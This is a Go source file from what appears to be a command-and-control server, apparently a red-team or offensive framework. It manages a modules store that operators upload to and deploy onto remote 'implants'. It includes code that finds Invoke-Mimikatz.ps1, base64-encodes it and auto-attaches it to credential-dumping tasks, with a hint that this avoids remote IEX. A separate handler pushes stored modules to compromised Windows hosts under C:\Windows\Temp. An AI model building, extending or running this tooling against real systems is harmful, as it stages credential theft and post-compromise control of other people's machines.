package server

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

const moduleMaxBytes = 20 << 20 // 20 MB

func (s *Server) modulesDir() string {
	dir := filepath.Join(s.cfg.Server.DataDir, "modules")
	_ = os.MkdirAll(dir, 0750)
	return dir
}

func sanitizeModuleName(name string) (string, error) {
	name = filepath.Base(strings.TrimSpace(name))
	if name == "" || name == "." || name == ".." {
		return "", fmt.Errorf("invalid module name")
	}
	if strings.ContainsAny(name, `/\`) {
		return "", fmt.Errorf("invalid module name")
	}
	return name, nil
}

func (s *Server) loadModuleBytes(name string) ([]byte, error) {
	safe, err := sanitizeModuleName(name)
	if err != nil {
		return nil, err
	}
	path := filepath.Join(s.modulesDir(), safe)
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("module is empty")
	}
	if len(data) > moduleMaxBytes {
		return nil, fmt.Errorf("module too large")
	}
	return data, nil
}

// loadMimikatzModuleB64 returns base64 of Invoke-Mimikatz.ps1 if present under data/modules.
func (s *Server) loadMimikatzModuleB64() string {
	candidates := []string{"Invoke-Mimikatz.ps1", "invoke-mimikatz.ps1", "mimikatz.ps1"}
	for _, name := range candidates {
		data, err := s.loadModuleBytes(name)
		if err == nil && len(data) > 0 {
			return base64.StdEncoding.EncodeToString(data)
		}
	}
	return ""
}

func (s *Server) handleModulesList(c *gin.Context) {
	dir := s.modulesDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		respond(c, gin.H{"success": true, "modules": []any{}})
		return
	}
	type modInfo struct {
		Name      string    `json:"name"`
		Size      int64     `json:"size"`
		UpdatedAt time.Time `json:"updated_at"`
	}
	list := make([]modInfo, 0)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		list = append(list, modInfo{
			Name:      e.Name(),
			Size:      info.Size(),
			UpdatedAt: info.ModTime(),
		})
	}
	respond(c, gin.H{
		"success": true,
		"modules": list,
		"hint":    "Upload Invoke-Mimikatz.ps1 here. Mimikatz tasks will auto-attach it to the implant (no remote IEX).",
	})
}

func (s *Server) handleModulesUpload(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	data, filename, ok := readFileUpload(c, "file")
	if !ok {
		return
	}
	if name := c.PostForm("name"); name != "" {
		filename = name
	}
	safe, err := sanitizeModuleName(filename)
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	if len(data) == 0 {
		respondError(c, http.StatusBadRequest, "empty file")
		return
	}
	if len(data) > moduleMaxBytes {
		respondError(c, http.StatusBadRequest, "file too large (max 20MB)")
		return
	}
	path := filepath.Join(s.modulesDir(), safe)
	if err := os.WriteFile(path, data, 0600); err != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "module upload"))
		return
	}
	s.LogAuditRecord(c, "upload_module", "module", safe, fmt.Sprintf("%d bytes", len(data)), true, nil)
	respond(c, gin.H{"success": true, "name": safe, "size": len(data)})
}

func (s *Server) handleModulesDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	safe, err := sanitizeModuleName(c.Param("name"))
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	path := filepath.Join(s.modulesDir(), safe)
	if err := os.Remove(path); err != nil {
		if os.IsNotExist(err) {
			respondError(c, http.StatusNotFound, "module not found")
			return
		}
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "module delete"))
		return
	}
	s.LogAuditRecord(c, "delete_module", "module", safe, "", true, nil)
	respond(c, gin.H{"success": true})
}

// handleModulesDeploy uploads a stored module onto an agent via the upload task.
func (s *Server) handleModulesDeploy(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	name := strings.TrimSpace(c.PostForm("name"))
	remotePath := strings.TrimSpace(c.PostForm("path"))
	if name == "" {
		var body struct {
			Name string `json:"name"`
			Path string `json:"path"`
		}
		if err := c.ShouldBindJSON(&body); err == nil {
			name = strings.TrimSpace(body.Name)
			if remotePath == "" {
				remotePath = strings.TrimSpace(body.Path)
			}
		}
	}
	if name == "" {
		respondError(c, http.StatusBadRequest, "module name required")
		return
	}

	safe, err := sanitizeModuleName(name)
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	data, err := s.loadModuleBytes(safe)
	if err != nil {
		respondError(c, http.StatusNotFound, "module not found on server")
		return
	}
	if remotePath == "" {
		remotePath = `C:\Windows\Temp\` + safe
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	task := s.issueAgentTask(c, id, TaskSpec{Type: "upload", Command: remotePath, Path: remotePath, Data: b64})
	if task == nil {
		return
	}
	s.LogAuditRecord(c, "deploy_module", "agent", id, safe+" → "+remotePath, true, nil)
	s.dispatchTask(c, task, "deploy_module", safe)
}
